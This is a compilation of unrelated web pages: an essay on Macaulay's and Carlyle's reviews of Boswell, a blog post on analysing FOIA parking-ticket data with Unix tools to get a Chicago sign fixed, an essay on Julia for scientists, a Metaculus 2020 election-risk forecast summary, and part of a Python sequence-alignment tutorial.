Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn2189487744" rel="footnote"><sup id="fnref2189487744">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn2189487745" rel="footnote"><sup id="fnref2189487745">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>

Using FOIA Data and Unix to halve major source of parking tickets

<h3>Intro</h3>

<p>This'll be my first blog post on the internet, ever. Hopefully it's interesting and accurate. Please point out any mistakes if you see any!</p>

<p>In 2016, I did some work in trying to find some hotspot areas for parking tickets to see if a bit of data munging could reduce those area's parking tickets. In the end, I only really got one cleaned up, but it was <em>one of</em> the most-ticketed spots in all of Chicago and led to about a 50% reduction in parking tickets.</p>

<p>Here's a bit of that story.</p>

<h3>Getting the data through FOIA:</h3>

<p>The system Chicago uses to store its parking tickets is called CANVAS. It's short for "City of Chicago Violation, Noticing and Adjudication Business Process And System Support" [sic] and managed by IBM.  Its most recent contract started in 2012, expires in 2022, and has a pricetag of over $190 million.</p>

<p>Most of Chicago's contracts and their Requests For Procurement (RFP) PDFs are published online. In CANVAS's contracts it gives a fair amount of info on CANVAS's backend infrastructure, including the fact that it uses Oracle 10g. In other words, a FOIA request can be fulfilled by IBM running some simple SQL. </p>

<p>With that information at hand, and a couple failed FOIA requests later, I sent this request to get the parking ticket data from Jan 1, 2009 to Mar 10, 2016:</p>

<p><em>"Please provide to me all possible information on all parking tickets between 2009 and the present day. This should include any information related to the car (make, etc), license plate, ticket, ticketer, ticket reason(s), financial information (paid, etc), court information (contested, etc), situational (eg, time, location), and photos/videos.  Ideally, this should also include any relevant ticket-related information stored within CANVAS.</em></p>

<p><em>[...]</em></p>

<p><em>This information will be used for data analysis for research.</em></p>

<p><em>Thanks in advance,</em></p>

<p><em>Matt Chapman"</em></p>

<h3>Data</h3>
<p>About a month later, a guy named Carl (in a fancy suit), handed me a CD with some <em>extremely</em> messy data in a semicolon delimited file named <code>A50462_TcktsIssdSince2009.txt</code>. The file had info on 17,806,818 parking tickets and spans from Jan 1, 2009 to Mar 10, 2016.</p>

<p>The data itself looks like this:</p>

<pre><code>head -5 A50462_TcktsIssdSince2009.txt

<h4>Some things to note about the data:</h4>

<ol>
<li>The file is semicolon delimited.</li>
<li>Each address is hand typed on a handheld device, often with gloves.</li>
<li>There are <em>millions</em> of typos in the address column. Including over 50,000 semicolons!</li>
<li>There is no lat/lon.</li>
</ol>

<p>What that amounts to is an extremely, extremely messy and unpredictable dataset that's incredibly to difficult to accurately map to lat/lon, which is needed for any sort of comprehensive GIS analysis.  There are a bunch of geocoder services that can help out here, but most of them have about a 50% accuracy rate. That said, with the help of a bit of scrubbing, that number can be boosted to closer to 90%. Another post for another time.</p>

<p>Here’s a sample list of Lake Shore Drive typos:</p>

<pre><code>Laks Shore Dr
Lawkeshore Dr West
Lkaeshore Dr
Lkae Shore Dr
Lkae Shore Drive
Lkaeshore Dr West
</code></pre>

<h3>Original Analysis</h3>

<p>I was particularly interested in finding areas that had hotspot areas that stood out. A lot of my time was spent just throwing hacky code at the problem and eventually wrote out two series of (hacky) commands that led to identifying a potentially fixable spot.</p>

<p>Originally, the work and analysis I was doing was with a combination of unix commands and gnuplot. Since then, I've migrated my code to python + matplotlib + SQL. But, for the sake of this blog, I wanted to show the original analysis.</p>

<p>Get count of tickets at addresses and ignoring first two digits:</p>

<pre><code>$ mawk -F';' '{print $7}' all_tickets.orig.txt
    | sed -r 's/^([0-9]*)[0-9][0-9] (.*)/\100 \2/'
    | sed -r 's/ (BLVD|ST|AV|AVE|RD)$//'
    | sort | uniq -c | sort -nr

  79320 1900 W OGDEN
  <b>60059 1100 N STATE</b>
  50594 100 N WABASH
  44503 1400 N MILWAUKEE

</code></pre>

<p>Get count of tickets, by ticket type, at specific addresses:</p>

<pre><code>$ mawk -F';' '{print $9,$7}' A50462_TcktsIssdSince2009.txt
    | sed -r 's/ (BLVD|ST|AV|AVE|RD)$//'
    | sort --parallel=4 | uniq -c | sort -nr

</code></pre>

<p>Both bits of code roughly show that there's something going on at 1100N state street, and 1166 N State St looks particularly suspicious..</p>

<p>So, have a look at the original set of signs:</p>

<center><img src="https://mchap.io/assets/2016signs.png"></center>

<p>Things going on that make this spot confusing:</p>

<ol>
<li>This is a taxi stand from 7pm to 5am for three cars’ lengths. Parking in a taxi stand is a $100 ticket.</li>
<li>When this spot isn’t a taxi stand, it’s metered parking – for a parking meter beyond an alleyway.</li>
<li><a href="https://mchap.io/assets/parkingreceipt.jpg">It’s possible to pay for parking here after 7pm</a>, which makes it look like parking is acceptable – especially with the “ParkChicago” sign floating there.</li>
<li>Confusion creates more confusion – if one car parks there, then more cars follow. Cha-ching.</li>
</ol>

<h3>Contacting the 2nd Ward</h3>

<p>With all that in mind, I contacted the second ward’s alderman’s office on April 12 explaining this, and got back this response:</p>

<p><em>"Hello Matt,</em></p>

<p><em>[…]The signs and the ordinance are currently being investigated.</em></p>

<p><em>In the interim, I highly recommend that you do not park there to avoid any further tickets.</em></p>

<p><em>Lisa&nbsp;Ryan</em></p>

<p><em>Alderman Brian Hopkins - 2nd&nbsp;Ward"</em></p>

<h3>The Fix</h3>

<p>On 1/11/17 I received this email from Lisa:</p>

<p><em>"Matt,</em></p>

<p><em>I don't know if you noticed the additional&nbsp;signage installed&nbsp;on State Street at the 3 Taxi Stand.</em></p>

<p><em>This should elevate [sic] any further confusion of vehicle parking.</em></p>

<p><em>Thank you for your patience.</em></p>

<p><em>Lisa Ryan"</em></p>

<p>Sure enough, two new signs were added!</p>

<center><img src="https://mchap.io/assets/new_signs.png"></center>

<p>The new taxi stand sign sets a boundary for a previously unbounded taxi stand. The No Parking sign explicitly makes it clear that parking here during taxi stand hours is a fineable offense. Neat!</p>

<p>And then there's this guy:
</p><center><img src="https://mchap.io/assets/thisguy.png"></center>

<h3>Results</h3>

<p>I recently decided to look at the number of tickets at that spot. Armed with a new set of data from another FOIA request, I did some analysis with python, pandas, and SQL. What I found is that the addition of a new sign effectively led to a 50% reduction in parking tickets between 1150 and 1200 N State St. Adding it all up, that's about 400 tickets fewer in 2017 and 200 so far in 2018 compared to 2016. All in all, that's about $60,000 worth in parking tickets!</p>

<p>The drop in slope to about 50% matches perfectly with Lisa’s email:</p>

<center><img src="https://mchap.io/assets/plot_fullcumsum.png"></center>

<p>And then comparing 2016 to 2017:
</p><center><img src="https://mchap.io/assets/plot_splitbyyear.png"></center>

<h3>What's next?</h3>

<p>All in all, the number of parking tickets is going up in Chicago, and this work shows that <em>something</em> can be done, even if small.</p>

<center><img src="https://mchap.io/assets/plot_fulldatasetcumsum.png"></center>

<p>This work is only on one small section of road, but I'm convinced that similar work can be on a systematic scale. It's mostly just a matter of digging through data and working directly with each ward.</p>

<p>The later analysis done here was also only done on the most recent dataset that the Department of Revenue they gave me. The two datasets have a different set of columns, so the two datasets need to be combined still. I hope to accomplish that soon! </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>You might have heard about Julia, the language often praised for the C-like performance it can attain while keeping a clean syntax reminiscent of Python. In this blog post, I want to share a different opinion why I like using Julia, which is only tangentially related to its pure performance. It is about the community Julia enables and how that could have a beneficial influence on the way scientific software is written.</p> <p>First off, I am not a trained computer scientist. Almost nobody in my research fields, psychology and neuroscience, is a trained computer scientist. But everybody needs to code nowadays to do research. Experiments are setup with code, data is analysed with code, graphs are made with code. So how does that work out if nobody is really trained for coding?</p> <p>It leads to a situation where people waste time and often produce inferior results because they don't really grasp the tools they are using. Code is often of low quality, neither version controlled, maintainable nor reproducible. Matlab, R and Python ecosystems offer tools that allow researchers to focus on their direct interest, the data, and spend less time fighting with the compilers and complicated syntax of C++ and Fortran. But this "convenience layer" contributes to a situation where people use tools without a deeper understanding what they are doing, without an idea of what to do when those tools are not enough. We have powerful packages with relatively user-friendly API's at our disposal in each dynamic language of choice. But the important and performant parts are written in C, C++ and Fortran, hidden from view.</p> <p>It is not easy to find out how things work under the hood in Python, R or Matlab. I think that this creates a big gap between users and creators of scientific tools.</p> <hr> <p>Students in a university R or Python data analysis course will probably learn a bit about loops and conditionals first, because that's just how everyone learning to code starts. But after that first phase, they will quickly move on to learning APIs of packages like dplyr, ggplot, pandas, because that's what's <em>actually used</em> by everybody. These API's tend to be quite removed from the basic building blocks of each language (like the common but non-standard <code>%&gt;%</code> syntax in R). If those tools don't offer something out of the ordinary as a pre-packaged functionality, the students are out of luck. They know that they shouldn't attempt to <em>write</em> any serious low-level analysis methods in R or Python directly, because that will probably be slow, and their tools of choice are also not made like that. One of the first things Python, R and Matlab novices learn is <em>"Vectorize everything! Don't write for-loops, they are slow!"</em>. How surprised would they be to find out that the inside of pandas, dplyr and co is full of for-loops, because they are indispensable building blocks in compiled languages?</p> <p>One such example of the boundaries of existing packages I've encountered in my previous work was when I analysed head movement data with Python's pandas library. I really wanted a column in my dataframe that had one rotation matrix per row, describing head orientation over time. But that was not possible to do effectively because a rotation matrix is just not a data type that pandas expects you to store in a column. At every corner my "weird" datatype caused problems with underlying assumptions of pandas, or numpy or matplotlib. In Julia, it would have been really easy to make a <code>Vector</code> with 3x3 matrices from <code>StaticArrays.jl</code>. <code>DataFrames.jl</code> doesn't care what your column vectors contain. To me, the point was not even to have the fastest solution, just to have a solution that cleanly expressed my intent.</p> <hr> <p>The two-language problem is often presented as an <em>inconvenience</em> to researchers because of its time cost. I think it is a bit more than that. True, it takes a lot of time to figure out a solution to a problem in a dynamic language and then transfer it faithfully to a compiled language, to write bug-free bindings and package everything up for reuse. Julia tries to solve that problem, and it does very well to bridge the gap between a glue language with simple syntax and a serious numerical powerhouse. Countless benchmarks can attest to its speed. But when we focus only at how much time it takes to use two languages, I think we overlook what kind of effect a language gap has on research communities in this age of code.</p> <p>The Julia community is filled with people from diverse scientific backgrounds. Many of them, like me, are not computer scientists. That doesn't stop them from being involved in writing serious low level packages. And if they are not writing packages themselves, they are often helping by filing issues and creating PRs, adding their own perspectives on design questions. They do this even for the Julia language itself, if they find bugs or API inconsistencies. When I was using Matlab, Python and R, I didn't see other researchers contribute to the fundamentals of their respective ecosystems in this way. In Julia, I see it all the time.</p> <p>This is possible, in my opinion, because there is a continuous path from surface-level glue code to close-to-the-metal high-performance code in Julia, which can be discovered almost playfully - usually driven by the desire to reduce the number of allocations or runtime of a small function. In Julia, novices can learn first principles in a beginner friendly way, without caring about types, writing code that looks basically like Python. These first principles don't lose their importance when <em>serious</em> packages are discovered. They instead become ever more powerful, the more knowledge a new user absorbs, because they can be combined in more and more flexible and innovative ways. As another example, if you use Stan from R, you have to feed it a script in a different language, while your <code>Turing.jl</code> models can be written in normal Julia. There's really no limit to what you can send through Bayesian inference this way. Additionally, advanced topics like metaprogramming and optimization are always only a few steps away, and interesting lessons about one's own code or the inner workings of Julia can be learned just by applying a couple of macros such as <code>@code_warntype</code> here and there. A transformation from beginner to expert code sometimes goes only through a couple minor changes like adding <code>@inbounds</code> in strategical places, or minimizing the use of allocations.</p> <p>For example, with <code>Revise.jl</code> and the <code>@edit</code> macro, it's quite simple to manipulate even Base functions on the fly, and play around with different implementations of Julia's fundamental building blocks. The multiple dispatch paradigm makes it possible to inject functionality deep into third party code and to connect one's homegrown implementations with the work of others in a way that I have never seen in Python, R or Matlab. This is not brittle tampering like, e.g., monkeypatching in Python, but allows you to meaningfully extend the available functionality if you want to. Packages are specifically written to be extensible by others, each dispatch presents an opportunity for third parties to hook into. One person might have a small idea, but through Julia's ability for composition, it can easily become part of something bigger (like the often cited Differential Equations + Measurements + Plot Recipe combo).</p> <hr> <p>I think Julia's gentle learning curve and raw processing power are an invitation to domain experts outside of computer science to help write the software their fields need. Personally, it makes me feel more powerful and self-sufficient to work in a dynamic language that can not only give access to other people's well written packages (written in Julia, but also R, Python and Matlab through <code>RCall.jl</code>, <code>PyCall.jl</code> and <code>MATLAB.jl</code>, respectively). It also allows me to write my own, and not just for toy problems but theoretically scalable even to supercomputers.</p> <p>I hope that in the future Julia loses the perception of being a niche language for numerics, which might discourage people who don't need just that from trying it. Instead, I would frame it as a powerful general programming language that offers something for everyone from beginners to experts and encourages collaboration and code reuse through its extensible multiple dispatch paradigm. If researchers write more algorithms in high-level Julia and not in low-level C++, this could make them more accessible for novices and easier to check for other researchers, because Julia shares the same "pseudo-code" qualities of Python (which doesn't actually look so clean anymore if everything is prefixed by <code>np.</code>). The Julia community also highly values CI and good test coverage and I hope that such things become more mainstream in the future, because every scientist that works with code can benefit from adopting these best practices.</p> <hr> <p>I wrote this post because I felt these aspects tend to be under-represented when Julia is discussed. Sometimes, the focus on micro-benchmarks and the resulting exaggerated or one-sided claims of superior performance expectedly cause users of other languages to go into defense mode. That's not necessary in my opinion. Yes, Python R and Matlab also have amazing fast packages that enable people to do great research. But these languages are also fundamentally limited in how low-level users can reach, and they don't allow for the same freedom to create beautiful and generic implementations that still harness all available computing power. They don't allow scientists to bridge the gap from user to creator quite as well. And bridging that gap holds a lot of potential, especially in today's world where everything is about code.</p>  </div></div>]]>

      <h2>
        Results of 2020 U.S. Election Risks Survey
        
      </h2>
      <p><small>
        By <a href="https://www.metaculus.com/accounts/profile/113129/">Juan</a> on <span local-datetime="2020-10-20T23:00:00+00:00">Oct. 20, 2020, 11 p.m. GMT</span>
        
      </small></p>
      <p>Metaculus and Rachel Aicher, Adjunct Lecturer in Political Science at Hunter College, City University of New York, are excited to announce the results of a forecasting session on risks to the 2020 U.S. election! We solicited probabilistic predictions about risks to the U.S. general election on 3 November 2020, including on issues relating to effective electoral administration, potential contestation of results, likelihood of civil unrest, and smoothness of any potential transition. We are building on the important work of others, including the <a href="https://paxsims.files.wordpress.com/2020/08/preventing-a-disrupted-presidential-election-and-transition-8-3-20.pdf">Transition Integrity Project</a> and <a href="https://lawecommons.luc.edu/cgi/viewcontent.cgi?article=2719&amp;context=luclj">Edward Foley</a>, who have also made the case that a landslide or otherwise decisive victory for either candidate would minimize the probabilities of such risks. Our aim is for relevant election security decision makers and the general public to be able to make informed choices on the basis of these probability estimates and, if needed, to make necessary preparations.</p>
<p>Below we have included a summary of our results, our methodology, and our analysis. For more, please see our <a href="https://drive.google.com/file/d/1CbkMoNE7eftNwHl5yC71MDmeXJTvzfk9/view?usp=sharing">full report</a>.</p>
<h4> Summary of Results </h4>

<p><b>Voter intimidation and challenges</b>: Experts’ median prediction for the number of voter intimidation/challenge calls that will be made through the Election Protection nonpartisan voter protection national hotline is 8.4k (80% CI: 1.5k - 18.3k). The number of such calls made during the 2016 election was approximately 4.7k. Experts assigned a 5% probability to over 20k calls being placed, which would be more than four times the number of calls made in 2016.</p>
<p><b>Presidential election result known</b>: Experts predicted a median of 8 November 2020 (80% CI: 3 November 2020 - 13 January 2021) for when the presidential election result will be called by the Associated Press.</p>
<p><b>Concession by losing candidate</b>: Experts assigned a median of 40% to the probability of President Trump conceding if the election is called by the Associated Press in favor of Democratic nominee Biden. They assigned a median 95% chance to Democratic nominee Biden conceding if the election is called by the Associated Press in favor of President Trump.</p>
<p><b>Domestic election interference</b>: Experts’ median prediction for President Trump ordering an agency or personnel under his authority to directly interfere in the vote counting process and for these orders to be successfully carried out is 10%.</p>
<p><b>Resolution by state legislature or Supreme Court</b>: Experts assigned a median of 7% to the probability of at least one state legislature appointing its own slate of electors instead of assigning electors in strict accordance with ballots cast by their state’s voters. Experts’ median prediction for the Supreme Court issuing a decision that determines the result of the election is 19%.</p>
<p><b>Election-related violence and unrest</b>: Experts predicted a median of 60 deaths (80% CI: 0 - 912) occurring due to election-related violence between 20 October 2020 and 20 January 2021. Experts assigned an 8% probability to over 1,000 deaths. Experts’ median prediction for President Trump invoking the Insurrection Act between 3 November 2020 and 20 January 2021 is 10%.</p>
<p><b>Confusion as to who will be the next president on Inauguration Day</b>: Experts assigned a 2% probability to it being unclear who is exercising the powers of the presidency after 12PM EST on 20 January 2021.</p>
<h4> Methodology and Logistics </h4>

<p>From 8 October to 15 October 2020, predictions were made for 10 questions related to risks to the 2020 U.S. election.</p>
<p>Two groups of experts were asked to participate: (i) subject matter experts (SMEs) and (ii) trained forecasters (TFs). SMEs were defined as political scientists with expertise in American government and electoral systems. They have several years of experience in political science research and have been closely following developments in the lead up to the U.S. general election on 3 November 2020. TFs were defined as the top 1% out of a total pool of approximately 13,000 forecasters here on Metaculus!</p>
<p>A total of 17 experts (8 subject matter experts and 9 trained forecasters) participated and submitted 220 predictions for aggregation into a consensus distribution. During the entire forecasting session, experts could submit multiple predictions for the same question and collaborate via a comment section underneath each question. Experts made 31 comments, sharing analyses and insights with one another across all questions.</p>
<h4> Analysis and Implications </h4>

<p>A key challenge for policy makers and risk analysts is to identify not only which scenarios are possible, but also which are probable and consequential enough to merit significant attention and resources for planning and mitigation. To this end, this forecasting study aims to map out the landscape of different risks related to the upcoming U.S. presidential election. This research brings together multiple experts’ perspectives to offer timely analysis and insight into election processes, transition issues, and public safety risks highlighted by prior studies and scenario planning. Experts were nearly certain that it will be clear who is president by Inauguration Day (only a median 2% chance otherwise), but were less confident in predicting exactly when the results will be called and noted significant probabilities of vote count interference, violence, and civil unrest. We take a closer look at some of these scenarios below.</p>
<p>Results indicate that experts anticipate higher levels of voter intimidation and challenge complaints than in the previous general election. The median prediction for the number of voter intimidation or challenge calls that will be made through the National Election protection hotline was 8,400 — roughly double the calls made during the <a href="https://lawyerscommittee.org/wp-content/uploads/2017/06/Anuual-report-2016.pdf">2016 election</a>. It is likely the voting process will be more fraught than usual.</p>
<p>Although the median prediction for when the presidential election result will be called was 8 November 2020, the wide 80% confidence interval ranging from 3 November 2020 to 13 January 2021 reflects a high degree of uncertainty, with some participants commenting that they anticipate delays due to mail-in ballots and vote counting issues.</p>
<p>Experts had divergent expectations of the two candidates’ likelihood of giving a concession speech if the election is called for their opponent: 95% for Biden, yet only 40% for Trump. This suggests a smoother transition if the election is called for Trump, as Biden is highly likely to concede, but a more contested and acrimonious transition if the election is called for Biden, since Trump will probably not offer a traditional and timely concession.</p>
<p>Results indicate it is unlikely authorities under the President’s remit will interfere in the vote counting process, although the experts’ median prediction of 10% likelihood for this scenario still gives cause for concern.</p>
<p>There has been much public conjecture as to how delayed ballot counting and contested results might be ultimately resolved, and results of this expert survey suggest a nearly 1 in 5 chance the Supreme Court will play a decisive role in the election outcome. Participants found it less likely (median 7% probability) that state legislatures will depart from established processes for assigning electors, however.</p>
<p>While large-scale violence and military intervention to quell civil unrest seem unlikely, experts still judged these possibilities to be far from remote. Experts predicted a median of 60 deaths occurring due to election-related violence, with an 80% confidence interval of 0 to 912 fatalities that reflects a high degree of uncertainty. Still, the real possibility of violence is a notable departure from the peaceful transitions that have been the hallmark of past U.S. elections. Results indicate an 8% probability of over 1,000 election-related deaths — suggesting that while widespread sustained clashes are unlikely, this possibility warrants real concern. Experts assigned a 10% median prediction that President Trump will invoke the Insurrection Act to mobilize troops during the transition period.</p>
<p>Overall, expert predictions indicate a non-trivial risk of vote count interference, contested results, and election-related violence — potentially departing from the established norms of concession and the peaceful transition of executive power that have characterized past U.S. elections. With expert predictions indicating the incumbent will likely refuse to concede if the election is not called in his favor and a nearly one-in-five probability the Supreme Court will play a decisive role in determining the election outcome, policy makers would do well to take these issues seriously.</p>

</a></p><p>By John Lekberg on October 25, 2020.
</p><hr>
<p>This week's post is about solving the "Sequence Alignment" problem. You will learn:</p>
<ul>
<li>How to create a <a href="https://en.wikipedia.org/wiki/Brute-force_search">brute force solution</a>.</li>
<li>How to create a more efficient solution using the <a href="https://en.wikipedia.org/wiki/Needleman%E2%80%93Wunsch_algorithm">Needleman-Wunsch algorithm</a> and <a href="https://en.wikipedia.org/wiki/Dynamic_programming">dynamic programming</a> .</li>
</ul>

<p>As input, you are given two <strong>sequences.</strong> E.g.</p>
<pre><code>"CAT"
"CT"
</code></pre>
<p>(The sequences can be <a href="https://en.wikipedia.org/wiki/String_(computer_science)">strings</a> or other <a href="https://en.wikipedia.org/wiki/Array_data_type">arrays</a> of data.)</p>
<p>As output, your goal is to produce an <strong>alignment</strong>, which pairs up elements of the sequence. E.g.</p>
<pre><code>C - C
A - T
T - 
</code></pre>
<p>An alignment can have gaps. E.g.</p>
<pre><code>C - C
A -
T - T
</code></pre>
<p>While an alignment can have gaps, it cannot change the relative order of the
sequence elements. E.g. "CT" cannot be changed into "TC".</p>
<p>Specifically, your goal is to produce an alignment with <strong>maximal score.</strong>
Here's how to calculate the score:</p>
<ul>
<li>Score = 0</li>
<li>Look at each pair of elements:
<ul>
<li>If there is a gap, then score -= 1</li>
<li>Otherwise, if the elements are the same, then score += 1.</li>
<li>Otherwise, if the elements are different, then score -= 1.</li>
</ul>
</li>
</ul>
<p>E.g. this alignment has a score of -1:</p>
<pre><code>C - C   (same, +1)
A - T   (different, -1)
T -     (gap, -1)
</code></pre>
<p>But this alignment has a score of +1:</p>
<pre><code>C - C   (same, +1)
A -     (gap, -1)
T - T   (same, +1)
</code></pre>
<p>So, your goal is to take two <strong>sequences</strong> and find an <strong>alignment</strong> with <strong>maximal score.</strong></p>

<p>For the input, I represent the <strong>sequences</strong> as <a href="https://docs.python.org/3/library/stdtypes.html#text-sequence-type-str">strings</a> or
<a href="https://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range">lists</a>.
E.g. I can represent the sequence "CAT" as</p>
<pre><code>"CAT"
</code></pre>
<p>or as</p>
<pre><code>["C", "A", "T"]
</code></pre>
<p>Really, anything that implements <a href="https://docs.python.org/3/library/collections.abc.html#collections.abc.Sequence">collections.abc.Sequence</a> (not just
<a href="https://docs.python.org/3/library/stdtypes.html#text-sequence-type-str">strings</a> and <a href="https://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range">lists</a>) will work.</p>
<p>For the output, I represent an <strong>alignment</strong> as a <a href="https://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range">list</a> of
<a href="https://docs.python.org/3/library/stdtypes.html#sequence-types-list-tuple-range">tuples</a> of indices (or <a href="https://docs.python.org/3/library/constants.html#None">None</a>, if there is a gap.)
E.g. this alignment:</p>
<pre><code>C - C
A - T
T -
</code></pre>
<p>would be represented as</p>
<pre><code>[(0, 0), (1, 1), (2, None)]
</code></pre>
<p>And this alignment:</p>
<pre><code>C - C
A -
T - T
</code></pre>
<p>would be represented as</p>
<pre><code>[(0, 0), (1, None), (2, 1)]
</code></pre>

<p>I like starting with <a href="https://en.wikipedia.org/wiki/Brute-force_search">brute force solutions</a> when I work on problems.
Brute force solutions tend to be simpler to implement and, fairly often, the
brute force solution is "good enough" for the actual inputs that will be
encountered.</p>
<p>I start by creating a function that takes two index ranges and iterates over
all possible alignments:</p>
<pre><code>from collections import deque


def all_alignments(x, y):
    """Return an iterable of all alignments of two
    sequences.

    x, y -- Sequences.
    """

    def F(x, y):
        """A helper function that recursively builds the
        alignments.

        x, y -- Sequence indices for the original x and y.
        """
        if len(x) == 0 and len(y) == 0:
            yield deque()

        scenarios = []
        if len(x) &gt; 0 and len(y) &gt; 0:
            scenarios.append((x[0], x[1:], y[0], y[1:]))
        if len(x) &gt; 0:
            scenarios.append((x[0], x[1:], None, y))
        if len(y) &gt; 0:
            scenarios.append((None, x, y[0], y[1:]))

        # NOTE: "xh" and "xt" stand for "x-head" and "x-tail",
        # with "head" being the front of the sequence, and
        # "tail" being the rest of the sequence. Similarly for
        # "yh" and "yt".
        for xh, xt, yh, yt in scenarios:
            for alignment in F(xt, yt):
                alignment.appendleft((xh, yh))
                yield alignment

    alignments = F(range(len(x)), range(len(y)))
    return map(list, alignments)
</code></pre>
<p>(This code uses: <a href="https://docs.python.org/3/library/collections.html#collections.deque">collections.deque</a>, <a href="https://docs.python.org/3/glossary.html#term-generator">generator function</a>,

<p>E.g. here are all possible alignments of "CAT" and "CT":</p>
<blockquote>
<pre><code>list(all_alignments("CAT", "CT"))
</code></pre>
</blockquote>
<pre><code>[[(0, 0), (1, 1), (2, None)],
 [(0, 0), (1, None), (2, 1)],
 [(0, 0), (1, None), (2, None), (None, 1)],
 [(0, 0), (1, None), (None, 1), (2, None)],
 [(0, 0), (None, 1), (1, None), (2, None)],
 [(0, None), (1, 0), (2, 1)],
 [(0, None), (1, 0), (2, None), (None, 1)],
 [(0, None), (1, 0), (None, 1), (2, None)],
 [(0, None), (1, None), (2, 0), (None, 1)],
 [(0, None), (1, None), (2, None), (None, 0), (None, 1)],
 [(0, None), (1, None), (None, 0), (2, 1)],
 [(0, None), (1, None), (None, 0), (2, None), (None, 1)],
 [(0, None), (1, None), (None, 0), (None, 1), (2, None)],
 [(0, None), (None, 0), (1, 1), (2, None)],
 [(0, None), (None, 0), (1, None), (2, 1)],
 [(0, None), (None, 0), (1, None), (2, None), (None, 1)],

 [(None, 0), (0, None), (None, 1), (1, None), (2, None)],
 [(None, 0), (None, 1), (0, None), (1, None), (2, None)]]
</code></pre>
<p>Here's a more readable form of the output: ("-" indicates a gap)</p>
<blockquote>
<pre><code>def print_alignment(x, y, alignment):
    print("".join(
        "-" if i is None else x[i] for i, _ in alignment
    ))
    print("".join(
        "-" if j is None else y[j] for _, j in alignment
    ))

x = "CAT"
y = "CT"
for alignment in all_alignments(x, y):
    print_alignment(x, y, alignment)
    print()

</code></pre>
<p>Next, I create a function that takes two sequences and an alignment to produce a score:</p>
<pre><code>def alignment_score(x, y, alignment):
    """Score an alignment.

    x, y -- sequences.
    alignment -- an alignment of x and y.
    """
    score_gap = -1
    score_same = +1
    score_different = -1

    score = 0
    for i, j in alignment:
        if (i is None) or (j is None):
            score += score_gap
        elif x[i] == y[j]:
            score += score_same
        elif x[i] != y[j]:
            score += score_different

    return score
</code></pre>
<p>Consider this alignment:</p>
<pre><code>C - C
A -
T - T
</code></pre>
<p>Here's an example of computing the score:</p>
<blockquote>
<pre><code>x = "CAT"
y = "CT"
alignment = [(0, 0), (1, None), (2, 1)]
alignment_score(x, y, alignment)
</code></pre>
</blockquote>
<pre><code>1
</code></pre>
<p>With these two functions -- <code>all_alignments</code> and <code>alignment_score</code> -- the
<a href="https://en.wikipedia.org/wiki/Brute-force_search">brute force solution</a> will search all alignments to find one with
a maximal score:</p>
<pre><code>from functools import partial

    return max(
        all_alignments(x, y),
        key=partial(alignment_score, x, y),
    )

<p>What's the <a href="https://en.wikipedia.org/wiki/Time_complexity">time complexity</a> of this solution? For two sequences of <var>n</var> and <var>m</var> elements:</p>
<ul>
<li>
<p>The number of possible alignments is given by the <a href="https://en.wikipedia.org/wiki/Delannoy_number">Delannoy numbers</a>. The number of alignments <var>D</var> is given by the <a href="https://en.wikipedia.org/wiki/Recurrence_relation">recurrence

<blockquote>

</blockquote>
<p>To give you a sense of how quickly this number grows:</p>
<pre><code>from functools import lru_cache


@lru_cache(maxsize=None)
def D(n, m):
